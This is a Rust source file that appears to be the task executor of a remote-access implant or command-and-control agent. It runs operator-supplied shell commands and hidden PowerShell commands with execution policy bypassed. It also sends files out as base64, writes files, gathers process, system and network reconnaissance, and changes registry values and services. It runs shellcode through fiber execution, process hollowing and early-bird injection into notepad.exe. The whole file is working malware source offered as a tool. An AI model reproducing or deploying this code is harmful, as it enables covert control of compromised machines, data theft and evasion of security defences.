use nexus_common::*;
use std::process::Command;
use base64::{Engine as _, engine::general_purpose};

#[cfg(target_os = "windows")]
use crate::fiber_execution::FiberExecutor;

pub struct TaskExecutor {
    #[cfg(target_os = "windows")]
    fiber_executor: FiberExecutor,
}

impl TaskExecutor {
    pub fn new() -> Self {
        Self {
            #[cfg(target_os = "windows")]
            fiber_executor: FiberExecutor::new(),
        }
    }

    pub async fn execute_task(&self, task_data: TaskData) -> Result<String> {
        match task_data.task_type.as_str() {
            "shell" => self.execute_shell_command(&task_data).await,
            "powershell" => self.execute_powershell_command(&task_data).await,
            "file_download" => self.download_file(&task_data).await,
            "file_upload" => self.upload_file(&task_data).await,
            "directory_listing" => self.list_directory(&task_data).await,
            "process_list" => self.list_processes().await,
            "system_info" => self.collect_system_info().await,
            "network_info" => self.collect_network_info().await,
            
            // Fiber-based execution methods
            "fiber_shellcode" => self.execute_fiber_shellcode(&task_data).await,
            "fiber_hollowing" => self.execute_fiber_hollowing(&task_data).await,
            "early_bird_injection" => self.execute_early_bird_injection(&task_data).await,
            
            #[cfg(target_os = "windows")]
            "registry_query" => self.query_registry(&task_data).await,
            #[cfg(target_os = "windows")]
            "registry_set" => self.set_registry(&task_data).await,
            #[cfg(target_os = "windows")]
            "service_control" => self.control_service(&task_data).await,
            
            _ => Err(NexusError::TaskExecutionError(
                format!("Unknown task type: {}", task_data.task_type)
            )),
        }
    }

    async fn execute_shell_command(&self, task_data: &TaskData) -> Result<String> {
        let command = task_data.parameters.get("command")
            .ok_or_else(|| NexusError::TaskExecutionError("Missing command parameter".to_string()))?;

        #[cfg(target_os = "windows")]
        let output = Command::new("cmd")
            .args(&["/C", command])
            .output()
            .map_err(|e| NexusError::TaskExecutionError(format!("Command execution failed: {}", e)))?;

        #[cfg(target_os = "linux")]
        let output = Command::new("sh")
            .args(&["-c", command])
            .output()
            .map_err(|e| NexusError::TaskExecutionError(format!("Command execution failed: {}", e)))?;

        let result = if output.status.success() {
            String::from_utf8_lossy(&output.stdout).to_string()
        } else {
            format!("Error ({}): {}", 
                output.status.code().unwrap_or(-1),
                String::from_utf8_lossy(&output.stderr)
            )
        };

        Ok(result)
    }

    async fn execute_powershell_command(&self, task_data: &TaskData) -> Result<String> {
        #[cfg(target_os = "windows")]
        {
            let command = task_data.parameters.get("command")
                .ok_or_else(|| NexusError::TaskExecutionError("Missing command parameter".to_string()))?;

            let output = Command::new("powershell")
                .args(&["-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", command])
                .output()
                .map_err(|e| NexusError::TaskExecutionError(format!("PowerShell execution failed: {}", e)))?;

            let result = if output.status.success() {
                String::from_utf8_lossy(&output.stdout).to_string()
            } else {
                format!("PowerShell Error ({}): {}", 
                    output.status.code().unwrap_or(-1),
                    String::from_utf8_lossy(&output.stderr)
                )
            };

            Ok(result)
        }

        #[cfg(not(target_os = "windows"))]
        Err(NexusError::TaskExecutionError("PowerShell not available on this platform".to_string()))
    }

    async fn download_file(&self, task_data: &TaskData) -> Result<String> {
        let file_path = task_data.parameters.get("path")
            .ok_or_else(|| NexusError::TaskExecutionError("Missing path parameter".to_string()))?;

        match std::fs::read(file_path) {
            Ok(content) => {
                let encoded = general_purpose::STANDARD.encode(&content);
                Ok(format!("File downloaded: {} bytes (base64: {})", content.len(), encoded))
            }
            Err(e) => Err(NexusError::TaskExecutionError(format!("File read error: {}", e))),
        }
    }

    async fn upload_file(&self, task_data: &TaskData) -> Result<String> {
        let file_path = task_data.parameters.get("path")
            .ok_or_else(|| NexusError::TaskExecutionError("Missing path parameter".to_string()))?;
        
        let content_b64 = task_data.parameters.get("content")
            .ok_or_else(|| NexusError::TaskExecutionError("Missing content parameter".to_string()))?;

        let content = general_purpose::STANDARD
            .decode(content_b64)
            .map_err(|e| NexusError::TaskExecutionError(format!("Base64 decode error: {}", e)))?;

        match std::fs::write(file_path, &content) {
            Ok(_) => Ok(format!("File uploaded: {} bytes to {}", content.len(), file_path)),
            Err(e) => Err(NexusError::TaskExecutionError(format!("File write error: {}", e))),
        }
    }

    async fn list_directory(&self, task_data: &TaskData) -> Result<String> {
        let dir_path = task_data.parameters.get("path")
            .ok_or_else(|| NexusError::TaskExecutionError("Missing path parameter".to_string()))?;

        match std::fs::read_dir(dir_path) {
            Ok(entries) => {
                let mut result = format!("Directory listing for {}:\n", dir_path);
                
                for entry in entries {
                    if let Ok(entry) = entry {
                        let metadata = entry.metadata().unwrap_or_else(|_| {
                            // Create a dummy metadata if we can't read it
                            std::fs::metadata(".").unwrap()
                        });
                        
                        let file_type = if metadata.is_dir() { "DIR" } else { "FILE" };
                        let size = if metadata.is_dir() { 0 } else { metadata.len() };
                        
                        result.push_str(&format!(
                            "{:<10} {:>10} {}\n",
                            file_type,
                            size,
                            entry.file_name().to_string_lossy()
                        ));
                    }
                }
                
                Ok(result)
            }
            Err(e) => Err(NexusError::TaskExecutionError(format!("Directory read error: {}", e))),
        }
    }

    async fn list_processes(&self) -> Result<String> {
        #[cfg(target_os = "windows")]
        {
            let output = Command::new("tasklist")
                .args(&["/fo", "csv"])
                .output()
                .map_err(|e| NexusError::TaskExecutionError(format!("Process list failed: {}", e)))?;

            Ok(String::from_utf8_lossy(&output.stdout).to_string())
        }

        #[cfg(target_os = "linux")]
        {
            let output = Command::new("ps")
                .args(&["aux"])
                .output()
                .map_err(|e| NexusError::TaskExecutionError(format!("Process list failed: {}", e)))?;

            Ok(String::from_utf8_lossy(&output.stdout).to_string())
        }
    }

    async fn collect_system_info(&self) -> Result<String> {
        let mut info = String::new();
        
        // Hostname
        if let Ok(hostname) = hostname::get() {
            info.push_str(&format!("Hostname: {}\n", hostname.to_string_lossy()));
        }

        // OS Information
        #[cfg(target_os = "windows")]
        {
            if let Ok(output) = Command::new("systeminfo").output() {
                info.push_str(&format!("System Info:\n{}\n", String::from_utf8_lossy(&output.stdout)));
            }
        }

        #[cfg(target_os = "linux")]
        {
            if let Ok(output) = Command::new("uname").args(&["-a"]).output() {
                info.push_str(&format!("System: {}\n", String::from_utf8_lossy(&output.stdout)));
            }
            
            if let Ok(content) = std::fs::read_to_string("/etc/os-release") {
                info.push_str(&format!("OS Release:\n{}\n", content));
            }
        }

        // Environment variables (filtered)
        info.push_str("Environment Variables:\n");
        for (key, value) in std::env::vars() {
            if key.contains("PATH") || key.contains("USER") || key.contains("HOME") || key.contains("TEMP") {
                info.push_str(&format!("  {}={}\n", key, value));
            }
        }

        Ok(info)
    }

    async fn collect_network_info(&self) -> Result<String> {
        #[cfg(target_os = "windows")]
        {
            let mut info = String::new();
            
            if let Ok(output) = Command::new("ipconfig").args(&["/all"]).output() {
                info.push_str(&format!("IP Configuration:\n{}\n", String::from_utf8_lossy(&output.stdout)));
            }
            
            if let Ok(output) = Command::new("netstat").args(&["-an"]).output() {
                info.push_str(&format!("Network Connections:\n{}\n", String::from_utf8_lossy(&output.stdout)));
            }
            
            Ok(info)
        }

        #[cfg(target_os = "linux")]
        {
            let mut info = String::new();
            
            if let Ok(output) = Command::new("ip").args(&["addr", "show"]).output() {
                info.push_str(&format!("IP Addresses:\n{}\n", String::from_utf8_lossy(&output.stdout)));
            }
            
            if let Ok(output) = Command::new("netstat").args(&["-tuln"]).output() {
                info.push_str(&format!("Network Connections:\n{}\n", String::from_utf8_lossy(&output.stdout)));
            }
            
            Ok(info)
        }
    }

    // Fiber-based execution methods
    async fn execute_fiber_shellcode(&self, task_data: &TaskData) -> Result<String> {
        #[cfg(target_os = "windows")]
        {
            let shellcode_b64 = task_data.parameters.get("shellcode")
                .ok_or_else(|| NexusError::TaskExecutionError("Missing shellcode parameter".to_string()))?;
            
            self.fiber_executor.execute_direct_fiber(shellcode_b64).await
        }

        #[cfg(not(target_os = "windows"))]
        Err(NexusError::TaskExecutionError("Fiber execution not supported on this platform".to_string()))
    }

    async fn execute_fiber_hollowing(&self, task_data: &TaskData) -> Result<String> {
        #[cfg(target_os = "windows")]
        {
            let shellcode_b64 = task_data.parameters.get("shellcode")
                .ok_or_else(|| NexusError::TaskExecutionError("Missing shellcode parameter".to_string()))?;
            
            let target_process = task_data.parameters.get("target_process")
                .unwrap_or(&"C:\\Windows\\System32\\notepad.exe".to_string());
            
            self.fiber_executor.execute_fiber_hollowing(shellcode_b64, target_process).await
        }

        #[cfg(not(target_os = "windows"))]
        Err(NexusError::TaskExecutionError("Fiber hollowing not supported on this platform".to_string()))
    }

    async fn execute_early_bird_injection(&self, task_data: &TaskData) -> Result<String> {
        #[cfg(target_os = "windows")]
        {
            let shellcode_b64 = task_data.parameters.get("shellcode")
                .ok_or_else(|| NexusError::TaskExecutionError("Missing shellcode parameter".to_string()))?;
            
            let target_process = task_data.parameters.get("target_process")
                .unwrap_or(&"C:\\Windows\\System32\\notepad.exe".to_string());
            
            self.fiber_executor.execute_early_bird_fiber(shellcode_b64, target_process).await
        }

        #[cfg(not(target_os = "windows"))]
        Err(NexusError::TaskExecutionError("Early bird injection not supported on this platform".to_string()))
    }

    // Windows-specific registry operations
    #[cfg(target_os = "windows")]
    async fn query_registry(&self, task_data: &TaskData) -> Result<String> {
        let key_path = task_data.parameters.get("key_path")
            .ok_or_else(|| NexusError::TaskExecutionError("Missing key_path parameter".to_string()))?;

        let mut cmd_args = vec!["query", key_path];
        
        if let Some(value_name) = task_data.parameters.get("value_name") {
            cmd_args.extend(&["/v", value_name]);
        }

        let output = Command::new("reg")
            .args(&cmd_args)
            .output()
            .map_err(|e| NexusError::TaskExecutionError(format!("Registry query failed: {}", e)))?;

        if output.status.success() {
            Ok(String::from_utf8_lossy(&output.stdout).to_string())
        } else {
            Err(NexusError::TaskExecutionError(
                format!("Registry query error: {}", String::from_utf8_lossy(&output.stderr))
            ))
        }
    }

    #[cfg(target_os = "windows")]
    async fn set_registry(&self, task_data: &TaskData) -> Result<String> {
        let key_path = task_data.parameters.get("key_path")
            .ok_or_else(|| NexusError::TaskExecutionError("Missing key_path parameter".to_string()))?;
        
        let value_name = task_data.parameters.get("value_name")
            .ok_or_else(|| NexusError::TaskExecutionError("Missing value_name parameter".to_string()))?;
        
        let value_data = task_data.parameters.get("value_data")
            .ok_or_else(|| NexusError::TaskExecutionError("Missing value_data parameter".to_string()))?;
        
        let value_type = task_data.parameters.get("value_type")
            .unwrap_or(&"REG_SZ".to_string());

        let output = Command::new("reg")
            .args(&[
                "add", key_path,
                "/v", value_name,
                "/t", value_type,
                "/d", value_data,
                "/f"
            ])
            .output()
            .map_err(|e| NexusError::TaskExecutionError(format!("Registry set failed: {}", e)))?;

        if output.status.success() {
            Ok(format!("Registry value set: {}\\{} = {}", key_path, value_name, value_data))
        } else {
            Err(NexusError::TaskExecutionError(
                format!("Registry set error: {}", String::from_utf8_lossy(&output.stderr))
            ))
        }
    }

    #[cfg(target_os = "windows")]
    async fn control_service(&self, task_data: &TaskData) -> Result<String> {
        let service_name = task_data.parameters.get("service_name")
            .ok_or_else(|| NexusError::TaskExecutionError("Missing service_name parameter".to_string()))?;
        
        let action = task_data.parameters.get("action")
            .ok_or_else(|| NexusError::TaskExecutionError("Missing action parameter".to_string()))?;

        let output = Command::new("sc")
            .args(&[action, service_name])
            .output()
            .map_err(|e| NexusError::TaskExecutionError(format!("Service control failed: {}", e)))?;

        if output.status.success() {
            Ok(format!("Service {} {}: {}", service_name, action, String::from_utf8_lossy(&output.stdout)))
        } else {
            Err(NexusError::TaskExecutionError(
                format!("Service control error: {}", String::from_utf8_lossy(&output.stderr))
            ))
        }
    }
}

impl Default for TaskExecutor {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[tokio::test]
    async fn test_task_executor_creation() {
        let executor = TaskExecutor::new();
        // Just test that we can create the executor
        assert!(true);
    }

    #[tokio::test]
    async fn test_shell_command_execution() {
        let executor = TaskExecutor::new();
        let mut params = HashMap::new();
        
        #[cfg(target_os = "windows")]
        params.insert("command".to_string(), "echo test".to_string());
        
        #[cfg(target_os = "linux")]
        params.insert("command".to_string(), "echo test".to_string());

        let task_data = TaskData {
            task_id: "test".to_string(),
            task_type: "shell".to_string(),
            command: "echo test".to_string(),
            parameters: params,
            timeout: Some(30),
            priority: 100,
        };

        let result = executor.execute_shell_command(&task_data).await;
        assert!(result.is_ok());
        let output = result.unwrap();
        assert!(output.contains("test"));
    }

    #[tokio::test]
    async fn test_unknown_task_type() {
        let executor = TaskExecutor::new();
        let task_data = TaskData {
            task_id: "test".to_string(),
            task_type: "unknown_task".to_string(),
            command: "test".to_string(),
            parameters: HashMap::new(),
            timeout: Some(30),
            priority: 100,
        };

        let result = executor.execute_task(task_data).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Unknown task type"));
    }

    #[cfg(target_os = "windows")]
    #[tokio::test]
    async fn test_fiber_shellcode_missing_parameter() {
        let executor = TaskExecutor::new();
        let task_data = TaskData {
            task_id: "test".to_string(),
            task_type: "fiber_shellcode".to_string(),
            command: "execute".to_string(),
            parameters: HashMap::new(), // Missing shellcode parameter
            timeout: Some(30),
            priority: 200,
        };

        let result = executor.execute_fiber_shellcode(&task_data).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Missing shellcode parameter"));
    }
}
